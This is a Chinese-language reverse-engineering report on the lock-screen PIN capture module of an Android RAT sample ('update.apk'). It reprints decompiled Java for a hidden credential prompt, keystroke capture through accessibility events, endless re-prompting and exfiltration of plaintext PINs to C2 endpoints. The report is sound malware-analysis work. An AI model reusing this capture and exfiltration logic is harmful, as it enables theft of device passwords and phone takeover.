# PIN 密码捕获模块分析

> **样本**: update.apk
> **触发入口**: `jadx-reference/rock/service/dqtvuisjd.java` → `capturePasswordViaSystemAuth()` (行 4292)
> **异步调度**: `jadx-reference/rock/service/dqtvuisjd$capturePasswordViaSystemAuth$2.java`
> **密码弹窗启动**: `jadx-reference/rock/service/dqtvuisjd.java` → `doLaunchSystemPasswordCapture()` (行 4873)
> **透明 Activity**: `jadx-reference/rock/activity/syuqattwmgit.java`
> **密码捕获管理器**: `jadx-reference/rock/service/modules/cipher/C0335a1.java` (CipherCaptureManager)
> **密码数据对象**: `jadx-reference/p000/C0598hx.java`
> **HTTP 上传 (credentials)**: `jadx-reference/rock/service/modules/NetworkManager$sendPasswordData$1.java`
> **HTTP 上传 (cipher)**: `jadx-reference/rock/service/dqtvuisjd$saveLockPinToServer$1.java`
> **触发方**: `jadx-reference/rock/service/modules/C0327b2.java` (WriteSettingsPermissionManager)
> **日期**: 2026-04-20

---

## 一、结论先行

PIN 密码捕获是一个**三阶段流程**：触发 → 捕获 → 上报，通过**三路冗余**确保 C2 一定收到密码。

```
自动化脚本完成
    │
    ▼
capturePasswordViaSystemAuth(true)      ← 触发
    │ delay 2s + 隐藏 ConfigMask 遮罩
    ▼
doLaunchSystemPasswordCapture()         ← 捕获
    │ syuqattwmgit(透明 Activity)
    │ + BiometricPrompt / KeyguardManager
    │ + CipherCaptureManager 侧信道监听
    ▼
三路上报到 C2                            ← 上报
    ├─ HTTP POST /api/sync/credentials  （密码明文 + 双通道）
    ├─ WebSocket send                    （同时发送）
    └─ HTTP POST /api/sync/cipher        （锁屏密码专用）
```

**核心设计**：
- 使用 Android 系统原生 `BiometricPrompt` / `KeyguardManager` API 弹出密码验证框——**不是仿冒 UI**
- 透明 Activity（1×1px）仅作为宿主，用户看到的是系统原生界面
- `CipherCaptureManager` 通过无障碍 `TYPE_VIEW_TEXT_CHANGED` 事件**侧信道**捕获键盘输入
- 验证失败自动重试（300ms 间隔），达到上限后仍继续安装流程

---

## 二、触发机制

### 2.1 从自动化完成到 PIN 弹窗的完整调用链

```
yw5xud 权限自动化完成
    │
    ▼
C0329b4.m211767a5() (行 169)
    "★★★ 授权流程结束，启动延迟初始化 + 配对流程 ★★★"
    ├─ SP: authorization_completed = true
    ├─ postAuthorizationInit()（注册短信拦截等延迟组件）
    └─ RunnableC0941o6(23) → 触发下一阶段
         │
         ▼
C0327b2 (WriteSettingsPermissionManager)
    │ 两个调用点：
    │ ├─ 行 4930: WRITE_SETTINGS 失败路径
    │ └─ 行 4990: m211741e6() 正常完成路径
    │
    ▼
dqtvuisjd.m211442c7(true)    ← capturePasswordViaSystemAuth
```

### 2.2 capturePasswordViaSystemAuth 完整逻辑

**方法**: `m211442c7(boolean isInstallationFlow)` (行 4292)

```java
t60.m214714d6("dqtvuisjd",
    "🔐 capturePasswordViaSystemAuth() 调用，isInstallationFlow=" + z);

// ═══ 检查 1: 密码捕获是否已完成（持久化标记）═══
SharedPreferences sp = getSharedPreferences("cipher_config", 0);
if (isInstallationFlow && sp.getBoolean("cipher_capture_completed", false)) {
    t60.m214714d6("dqtvuisjd", "🔐 密码捕获已完成（持久化标记），跳过");
    return;
}

// ═══ 检查 2: CipherCaptureManager 是否已有捕获的密码 ═══
C0598hx captured = cipherCaptureManager.m211819d0(false);  // 文本密码
if (captured == null) {
    captured = cipherCaptureManager.m211819d0(true);       // 图案密码
}
if (captured != null) {
    t60.m214714d6("dqtvuisjd", "🔐 已有捕获的密码，跳过系统验证");
    m211533n1(captured);           // → 上传到 C2
    if (isInstallationFlow) {
        m211449d4();               // → completeInstallationWithCipher
    }
    return;
}

// ═══ 检查 3: 设备是否设置了锁屏密码 ═══
KeyguardManager km = (KeyguardManager) getSystemService("keyguard");
if (!km.isKeyguardSecure()) {
    t60.m214714d6("dqtvuisjd", "🔐 设备未设置锁屏密码，跳过密码捕获");
    if (isInstallationFlow) {
        // 无密码设备 → 直接标记完成
        SP("app_state").putBoolean("cipher_excluded", true);
        g60.m212896a0(..., 0, false, 224);  // InstallCompleteMgr
        m211534n2();                         // tryShowPackageVerify
    }
    return;
}

// ═══ 通过所有检查 → 记录安装状态 ═══
if (isInstallationFlow) {
    // 记录锁屏类型到 app_status.txt
    String lockType = new nm0(this).m214126a5();
    // 判断: "4pin" / "6pin" / "pattern" / "mixed" / "none" / "unknown"
    C0107as.getInstance(this).m210507a6(lockType, true, "");
}

// ═══ 异步启动密码捕获（带延迟）═══
AbstractC0780a0.m213692a3(coroutineScope, null,
    new dqtvuisjd$capturePasswordViaSystemAuth$2(null, this, isInstallationFlow), 3);
```

### 2.3 异步延迟调度

**文件**: `dqtvuisjd$capturePasswordViaSystemAuth$2.java`

```java
public final Object invokeSuspend(Object obj) {
    if (state == 0) {
        if (isInstallationFlow) {
            // ★ 延迟 2000ms — 等待 ConfigMask 遮罩完全隐藏
            state = 1;
            if (delay(2000L, this) == COROUTINE_SUSPENDED) {
                return COROUTINE_SUSPENDED;
            }
        }
        // 直接启动密码捕获
        dqtvuisjd.f52485l6 = 0;       // 重试计数器归零
        dqtvuisjd.f52474k5 = true;     // 启用密码监听标记
        dqtvuisjd.m211457e6(isInstallationFlow);  // ★ 启动 PIN 弹窗
        return Unit;
    }
    if (state == 1) {
        // delay 完成后
        // ★ 先隐藏 ConfigMask 遮罩
        C0763km configMask = dqtvuisjd.f52427f8;
        if (configMask != null) {
            configMask.m213600a0();  // hide()
            t60.m214714d6("dqtvuisjd", "🖤 已隐藏配置遮罩");
        }
        // 然后启动密码捕获
        dqtvuisjd.f52485l6 = 0;
        dqtvuisjd.f52474k5 = true;
        dqtvuisjd.m211457e6(isInstallationFlow);  // ★ 启动 PIN 弹窗
        return Unit;
    }
}
```

**关键时序**：
1. `capturePasswordViaSystemAuth(true)` 被调用
2. **等待 2 秒**（让 ConfigMask 进度条遮罩有时间消失）
3. 隐藏 ConfigMask 遮罩（`configMask.hide()`）
4. 重置重试计数器 + 启用监听
5. 调用 `doLaunchSystemPasswordCapture()` 弹出 PIN 窗口

---

## 三、密码捕获实现

### 3.1 doLaunchSystemPasswordCapture

**方法**: `m211457e6(boolean isInstallationFlow)` (行 4873)

```java
public final void m211457e6(final boolean z) {
    // 前置检查: 密码监听是否已停止
    if (!this.f52474k5) {
        t60.m214702c3("dqtvuisjd", "🔐 密码监听已停止，不再弹出");
        return;
    }

    t60.m214714d6("dqtvuisjd",
        "🔐 启动系统真实密码验证... (第" + (this.f52485l6 + 1) + "次)");

    // ★ 步骤 1: 初始化 CipherCaptureManager 进入监听模式
    C0335a1.m211788c1(cipherCaptureManager);
    t60.m214714d6("dqtvuisjd", "✅ CipherCaptureManager 密码监听已启用");

    // ★ 步骤 2: 设置验证结果回调
    syuqattwmgit.f51917a3.setOnCredentialVerified(callback);
    // → callback 在步骤 4 中处理验证结果

    // ★ 步骤 3: 启动透明 Activity
    Intent intent = new Intent(this, syuqattwmgit.class);
    intent.putExtra("credential_type", 0);    // 0=应用验证
    intent.addFlags(805306368);               // NEW_TASK | CLEAR_TOP

    // 启动策略: 优先通过前台 Activity
    Activity currentActivity = iuzxujjtqev.getCurrentActivity();
    if (currentActivity != null && !currentActivity.isFinishing()) {
        currentActivity.startActivity(intent);
        // "🔐 [策略1] 通过前台 Activity context 直接启动 syuqattwmgit"
    } else {
        // 回退: moveTaskToFront + 延迟 800ms 启动
        ActivityManager.getAppTasks().get(0).moveToFront();
        new Handler().postDelayed(new RunnableC1052p1(intent, 18, this), 800);
        // 如果仍失败 → 通过全屏通知启动
    }
}
```

### 3.2 syuqattwmgit — 透明密码验证 Activity

**文件**: `jadx-reference/rock/activity/syuqattwmgit.java`

#### 3.2.1 透明窗口伪装

```java
// onCreate (行 210-248)
View view = new View(this);
setContentView(view);

WindowManager.LayoutParams attr = getWindow().getAttributes();
attr.dimAmount = 0.0f;       // 无暗化效果
attr.width = 1;               // 1px 宽
attr.height = 1;              // 1px 高
attr.gravity = TOP | START;   // 左上角
getWindow().getDecorView().setBackgroundColor(0);  // 完全透明
getWindow().setFlags(SHARE_MINIMUM, SHARE_MINIMUM);
getWindow().addFlags(FLAG_NOT_FOCUSABLE);
getWindow().addFlags(FLAG_NOT_TOUCHABLE);
getWindow().addFlags(FLAG_CLEAR_TOP);
getWindow().addFlags(FLAG_KEEP_SCREEN_ON);
```

**效果**：Activity 本身完全不可见（1×1px 透明），用户只看到系统弹出的密码验证框。

#### 3.2.2 社会工程文本

```java
// m211192a1() — 两种验证模式
if (credential_type == 0) {
    // 模式 0: 应用验证
    title    = "Verify personal identity";
    subtitle = "Privacy protection";
    desc     = "To protect your privacy, please enter your lock screen
                password to verify that you are the one making the operation.";
} else {
    // 模式 1: 系统更新
    title    = "Verify lock screen password";
    subtitle = "Fix system security vulnerabilities";
    desc     = "Please enter your lock screen password to complete the
                system update and fix security vulnerabilities.";
}
```

**注意**：这些文本通过 `t60.m214713d4()` 从配置读取，**C2 可远程修改**。

#### 3.2.3 系统认证 API 调用

```java
// onResume (行 263-279)
// 启用 CipherCaptureManager 监听
C0335a1.m211788c1(CipherCaptureManager.getInstance(dqtvuisjd));

// 延迟 300ms 后启动认证
new Handler().postDelayed(triggerAuth, 300);

// 认证方式选择
if (API >= 30) {
    // ★ BiometricPrompt — Android 11+
    BiometricPrompt prompt = new BiometricPrompt.Builder(this)
        .setTitle(title)
        .setSubtitle(subtitle)
        .setDescription(description)
        .setAllowedAuthenticators(DEVICE_CREDENTIAL)  // 32768 = 仅设备凭证
        .build();
    prompt.authenticate(cancellationSignal, mainExecutor, authCallback);
    // 发送广播通知密码框已显示
    sendBroadcast(new Intent("com.storm.safe.rock.BIOMETRIC_PROMPT_SHOWN"));
} else {
    // ★ KeyguardManager — Android 10
    KeyguardManager km = (KeyguardManager) getSystemService("keyguard");
    Intent credIntent = km.createConfirmDeviceCredentialIntent(title, desc);
    credIntent.addFlags(FLAG_CLEAR_TASK | FLAG_CLEAR_TOP | FLAG_EXCLUDE_FROM_RECENTS);
    sendBroadcast(new Intent("com.storm.safe.rock.BIOMETRIC_PROMPT_SHOWN"));
    startActivityForResult(credIntent, 1001);
}
```

**关键**：`setAllowedAuthenticators(DEVICE_CREDENTIAL)` 表示只接受设备凭证（PIN/密码/图案），不接受指纹/面部。这是因为 RAT 需要**捕获密码明文**，生物认证无法提供明文。

#### 3.2.4 认证结果处理

```java
// BiometricPrompt callback (yk1.java)
onAuthenticationSucceeded → m211191a0(true)
onAuthenticationFailed    → m211191a0(false)

// KeyguardManager callback
onActivityResult(1001, resultCode, ...) {
    if (resultCode == RESULT_OK) m211191a0(true);
    else m211191a0(false);
}

// m211191a0(boolean success) — 行 90
public final void m211191a0(boolean z) {
    // 1. CipherCaptureManager 确认并保存密码
    if (success) {
        cipherCaptureManager.m211812b1();  // confirmAndSaveLastCipher
    } else {
        cipherCaptureManager.m211816b6();  // discard（丢弃缓冲密码）
    }
    cipherCaptureManager.m211815b5();      // 关闭监听模式
    
    // 2. 恢复无障碍模式
    dqtvuisjd.setAssistMode();
    
    // 3. finish Activity
    finish();
    
    // 4. 触发回调
    if (onCredentialVerified != null) {
        onCredentialVerified.invoke(Boolean.valueOf(z));
    }
    onCredentialVerified = null;
}
```

### 3.3 CipherCaptureManager — 侧信道密码捕获

**文件**: `C0335a1.java`

**工作原理**：不是从 BiometricPrompt 回调获取密码（回调只返回 success/fail），而是通过无障碍服务监听 `TYPE_VIEW_TEXT_CHANGED` 事件，在用户输入密码的同时逐字符捕获。

#### 3.3.1 方法映射

| 功能 | 混淆方法名 | 行号 | 说明 |
|---|---|---|---|
| 进入监听模式 | `m211788c1` (static) | 317 | 设置 f53297b1=true，清空缓冲区，配置无障碍拦截 |
| 获取捕获的密码 | `m211819d0` | 1714 | synchronized，参数 boolean=是否锁定模式 |
| 确认并保存密码 | `m211812b1` | 1475 | 验证成功时调用，持久化到 SharedPreferences |
| 丢弃缓冲密码 | `m211815b5` | 1605 | 验证失败时调用 |
| 关闭监听 | `m211816b6` | — | 设置 f53297b1=false |
| 上传到服务器 | `uploadCipherToServer` | 1548 | 协程异步上传 |
| 删除已保存密码 | `m211814b4` | 1596 | 清除 SharedPreferences 中的密码 |

#### 3.3.2 监听模式初始化（m211788c1）

进入监听模式时执行以下操作：
1. 设置 `f53297b1 = true`（监听激活标志）
2. 清空所有缓冲区和历史状态
3. 调用 `m211823e0()` 配置无障碍事件拦截
4. 发布延迟任务（200ms / 500ms / 1000ms / 1500ms）用于图案密码检测

#### 3.3.3 密码验证规则（行 1526-1592）

CipherCaptureManager 不是盲目记录所有输入，而是有验证逻辑过滤无效密码：

| 规则 | 阈值 | 说明 |
|---|---|---|
| 文本密码最短长度 | 4 字符 | PIN/密码至少 4 位 |
| 图案密码最少节点 | 4 个点 | 图案至少连接 4 个点 |
| 掩码字符过滤 | — | 自动过滤 `•`/`●`/`*` 等掩码字符，避免记录掩码而非实际输入 |
| 去重检查 | — | 与已捕获密码对比，避免重复记录 |

```
用户在系统密码框输入 "1"
    → AccessibilityEvent(TYPE_VIEW_TEXT_CHANGED, text="•")
    → CipherCaptureManager 记录 "1"

用户输入 "12"
    → AccessibilityEvent(TYPE_VIEW_TEXT_CHANGED, text="••")
    → CipherCaptureManager 记录 "12"

用户输入 "123456"
    → CipherCaptureManager 最终捕获 "123456"

系统验证成功 → confirmAndSaveLastCipher()
    → C0598hx { f56761a1="123456", f56762a2=null }
```

**密码数据对象 `C0598hx`**（完整 9 字段）：

| 字段 | 类型 | 含义 |
|---|---|---|
| `f56760a0` | `String` | cipherGradeCode — 密码强度等级（"1"=图案, "2"=PIN） |
| `f56761a1` | `String` | textCipher — 文本密码（PIN/数字/混合） |
| `f56762a2` | `List` | patternCipher — 图案密码点序列（如 `[0,1,2,4,6,7,8]`） |
| `f56763a3` | `List` | patternScreenPoints — 图案密码的屏幕坐标点列表 |
| `f56764a4` | `boolean` | isLocked — 设备是否处于锁定状态 |
| `f56765a5` | `long` | captureTime — 密码捕获时间戳 |
| `f56766a6` | `Rect` | boundsInScreen — 密码输入控件的屏幕绝对坐标 |
| `f56767a7` | `Rect` | boundsInParent — 密码输入控件的父级相对坐标 |
| `f56768a8` | `List` | touchCipher — 触摸事件序列（x, y, action） |

### 3.4 验证结果回调 — 重试与完成

**回调方法**: `dqtvuisjd$doLaunchSystemPasswordCapture$2` (行 4896)

```java
public final Object invoke(Object obj) {
    boolean success = ((Boolean) obj).booleanValue();
    
    if (success && cipherCaptureManager != null) {
        // ═══ 成功路径 ═══
        f52474k5 = false;   // 停止密码监听
        f52485l6 = 0;       // 重试计数器归零
        
        // 获取捕获的密码
        C0598hx cipher = cipherCaptureManager.m211819d0(false);  // 文本
        if (cipher == null) {
            cipher = cipherCaptureManager.m211819d0(true);       // 图案
        }
        
        // ★ 上传到 C2
        if (cipher != null) {
            this.m211533n1(cipher);  // → sendPasswordData (HTTP + WebSocket)
        }
        
        // 进入安装完成流程
        if (isInstallationFlow) {
            this.m211449d4();  // → completeInstallationWithCipher
        }
        
    } else if (success && cipherCaptureManager == null) {
        // 成功但 Manager 未初始化 → 仍完成流程
        f52474k5 = false;
        if (isInstallationFlow) {
            this.m211449d4();
        }
        
    } else {
        // ═══ 失败/取消路径 ═══
        f52485l6++;  // 重试计数器 +1
        
        if (f52474k5) {  // 监听仍启用
            if (f52485l6 >= f52486l7) {  // 达到最大重试次数
                t60.m214726f4("dqtvuisjd",
                    "⚠️ 密码捕获已达最大重试次数(" + f52486l7 + ")，停止");
                f52474k5 = false;
                f52485l6 = 0;
                cipherCaptureManager.m211815b5();  // 关闭监听
                if (isInstallationFlow) {
                    this.m211449d4();  // 无密码也继续
                }
            } else {
                // ★ 800ms 后重新弹出
                t60.m214714d6("dqtvuisjd",
                    "🔄 密码验证失败/取消，" + f52487l8 + "ms(默认300ms)后重新弹出 ("
                    + f52485l6 + "/" + f52486l7 + ")");
                new Handler().postDelayed(
                    new RunnableC0449ea(this, isInstallationFlow, 2),
                    f52487l8);  // 默认 800ms
            }
        } else {
            // 监听已被外部停止
            if (isInstallationFlow) {
                this.m211449d4();
            }
        }
    }
    return Unit;
}
```

**重试机制汇总**：

| 参数 | 变量 | 默认值 | 含义 |
|---|---|---|---|
| 重试计数器 | `f52485l6` | 0 | 当前重试次数 |
| 最大重试次数 | `f52486l7` | **Integer.MAX_VALUE** | 重试上限（实际无限重试） |
| 重试间隔 | `f52487l8` | **300ms** | 每次重试的等待时间 |
| 监听启用标记 | `f52474k5` | true | 控制是否继续重试 |

> **注意**：默认值来自 `dqtvuisjd.java` 构造函数（行 1411-1412）：`f52486l7 = Integer.MAX_VALUE; f52487l8 = 300L;`
> 这意味着用户取消验证后，RAT 会以 300ms 间隔**无限循环**弹出密码框，直到用户输入正确密码或外部停止监听（`f52474k5 = false`）。

---

## 四、密码上报到 C2

### 4.1 三路冗余上报架构

```
捕获到密码
    │
    ├── 路径 1: m211533n1(cipher)
    │   → NetworkManager.m211662c8(password, type, inputMethod)
    │   → NetworkManager$sendPasswordData$1
    │       │
    │       ├─ ★ HTTP: POST /api/sync/credentials
    │       │   Headers: X-Client-ID + X-Client-Token (HmacSHA256)
    │       │   Body: {password, passwordType, inputMethod,
    │       │          appName:"", packageName:"", confidence:100}
    │       │
    │       └─ ★ WebSocket: dataSyncClient.send()
    │           Body: {type:"O1gCKVo3HipoMipJBS9fPQg=",
    │                  passwordType, password, inputMethod,
    │                  deviceId, timestamp}
    │
    ├── 路径 2: m211449d4() → completeInstallationWithCipher
    │   → C0107as.m210507a6(type, isLocked, cipherText)
    │   → 写入本地 app_status.txt（持久化存储）
    │
    └── 路径 3: saveLockPinToServer / saveLockPatternCipherToServer
        → 直接 OkHttpClient（不经过 HttpManager）
        → ★ HTTP: POST /api/sync/cipher
            Headers: X-Client-ID (无 Token)
            Body: {cipherGradeCode, textCipher, patternCipher,
                   isLocked:true, captureTime}
```

### 4.2 路径 1：POST /api/sync/credentials（通用密码上传）

**文件**: `NetworkManager$sendPasswordData$1.java` 行 64-138

**HTTP 请求**：

```
POST {serverUrl}/api/sync/credentials
Content-Type: application/json; charset=utf-8
X-Client-ID: {deviceId}
X-Client-Token: {HmacSHA256(deviceKeySalt, deviceId).substring(0,32)}
```

**请求 Body**：

```json
{
    "deviceId": "android_id_xxx",
    "password": "123456",
    "passwordType": "pin_4",
    "inputMethod": "system_auth_capture",
    "appName": "",
    "packageName": "",
    "confidence": 100,
    "timestamp": 1713600000000
}
```

**同时通过 WebSocket 发送**：

```json
{
    "type": "O1gCKVo3HipoMipJBS9fPQg=",
    "passwordType": "pin_4",
    "password": "123456",
    "inputMethod": "system_auth_capture",
    "deviceId": "android_id_xxx",
    "timestamp": 1713600000000
}
```

### 4.3 路径 3：POST /api/sync/cipher（锁屏密码专用）

**文件**: `dqtvuisjd$saveLockPinToServer$1.java` 行 64-94

**HTTP 请求**（直接 OkHttpClient，不走 HttpManager）：

```
POST {serverUrl}/api/sync/cipher
Content-Type: application/json
X-Client-ID: {deviceId}
```

**请求 Body（PIN/密码）**：

```json
{
    "cipherGradeCode": "2",
    "textCipher": "123456",
    "patternCipher": "",
    "isLocked": true,
    "captureTime": 1713600000000
}
```

**请求 Body（图案密码）**：

```json
{
    "cipherGradeCode": "1",
    "textCipher": "",
    "patternCipher": "0,1,2,4,6,7,8",
    "isLocked": true,
    "captureTime": 1713600000000
}
```

### 4.4 高级捕获数据（CipherCaptureManager 直传）

**文件**: `CipherCaptureManager$uploadCipherToServer$1.java` 行 134

```
POST {goServerUrl}/api/sync/cipher
X-Client-ID: {deviceId}
```

```json
{
    "deviceId": "android_id_xxx",
    "textCipher": "123456",
    "cipherType": "numeric",
    "cipherGradeCode": 2,
    "patternCipher": null,
    "patternScreenPoints": [],
    "isLocked": true,
    "captureTime": 1713600000000,
    "boundsInScreen": {"left":0, "top":0, "right":1080, "bottom":2400},
    "boundsInParent": {"left":0, "top":0, "right":1080, "bottom":2400},
    "touchCipher": [
        {"x":540, "y":1200, "action":"down"},
        {"x":540, "y":1200, "action":"up"}
    ],
    "lockBatchId": "batch_xxx"
}
```

### 4.5 接口汇总

| # | 接口 | 方法 | 认证 | 数据内容 | 触发时机 |
|---|---|---|---|---|---|
| 1 | `/api/sync/credentials` | POST | X-Client-ID + X-Client-Token | 密码明文 + 类型 + 输入方式 + 置信度 | 验证成功回调 |
| 2 | `/api/sync/cipher` | POST | X-Client-ID only | 密码明文 + 密码等级 + 锁屏状态 + 捕获时间 | completeInstallation |
| 3 | WebSocket | send | WSS session | 密码明文 + type 加密枚举 + deviceId | 同时于路径 1 |

---

## 五、完整时序图

```
T+0.0s   yw5xud 权限自动化完成
T+0.1s   WriteSettingsPermManager 调用
         capturePasswordViaSystemAuth(true)
         │
         ├─ 检查 1: cipher_capture_completed? → NO → 继续
         ├─ 检查 2: 已有捕获密码? → NO → 继续
         ├─ 检查 3: isKeyguardSecure? → YES → 继续
         └─ 记录安装状态到 app_status.txt
         │
T+0.2s   异步调度: delay(2000ms)
T+2.2s   ★ ConfigMask 遮罩隐藏
T+2.3s   f52485l6 = 0 (重试计数器归零)
         f52474k5 = true (启用密码监听)
         ★ doLaunchSystemPasswordCapture(true)
         │
T+2.4s   CipherCaptureManager 进入监听模式
         → 拦截 TYPE_VIEW_TEXT_CHANGED 事件
         │
T+2.5s   syuqattwmgit Activity 启动 (1×1px 透明)
T+2.8s   BiometricPrompt / KeyguardManager 弹出
         → 用户看到系统原生 "验证身份" 对话框
         → 广播: BIOMETRIC_PROMPT_SHOWN
         │
T+5s     用户输入密码 "123456"
         → CipherCaptureManager 逐字符捕获
         │
T+6s     系统验证成功 → callback(true)
T+6.0s   syuqattwmgit.m211191a0(true)
         → confirmAndSaveLastCipher()
         → 关闭监听模式
         → finish() Activity
         │
T+6.1s   ★ 路径 1: HTTP POST /api/sync/credentials
         Body: {password:"123456", passwordType:"pin_4",
                inputMethod:"system_auth_capture", confidence:100}
         │
T+6.1s   ★ 路径 1: WebSocket send
         Body: {type:"O1gCKVo3...", password:"123456", ...}
         │
T+6.2s   m211449d4() = completeInstallationWithCipher
         ├─ SP: cipher_excluded = true
         ├─ 分类密码: 4pin / 6pin / pattern / mixed
         ├─ ★ 路径 3: POST /api/sync/cipher
         │   Body: {textCipher:"123456", cipherGradeCode:"2",
         │          isLocked:true, captureTime:...}
         │
         ├─ g60.m212896a0() — InstallCompleteMgr
         └─ m211534n2() — tryShowPackageVerify
```
### 6.5 Logcat 关键日志

```
"🔐 capturePasswordViaSystemAuth() 调用"
"🔐 启动系统真实密码验证... (第X次)"
"✅ CipherCaptureManager 密码监听已启用"
"🔐 系统密码验证结果: 成功/失败"
"✅ 锁屏PIN已上传到服务器: type=X, len=Y"
"✅ 密码已通过 HTTP 上传: type=X"
"🔄 密码验证失败/取消，300ms后重新弹出"
```

## 八、与其他文档交叉关联

| 文档 | 关联点 |
|---|---|
| `Vendor自动化脚本执行完成后完整执行链路分析.md` | 阶段 2 PIN 捕获在完整执行链中的位置 |
| `ConfigMask配置遮罩机制分析.md` | 遮罩在 PIN 弹出前 2s 隐藏 |
| `C2_HTTP通信触发条件与数据分析.md` | `/api/sync/credentials` 和 `/api/sync/cipher` 端点详情 |
| `WebSocket命令模块分析.md` | `ENABLE_PASSWORD_MONITORING` / `GET_DEVICE_PASSWORD` 命令 |
| `WebView伪装前台机制分析.md` | PIN 弹窗在 WebView 页面上方显示 |
| `APK状态查询接口审计.md` | `GET_PASSWORD_STATUS` 命令查询已捕获的锁屏/支付宝/微信密码 |
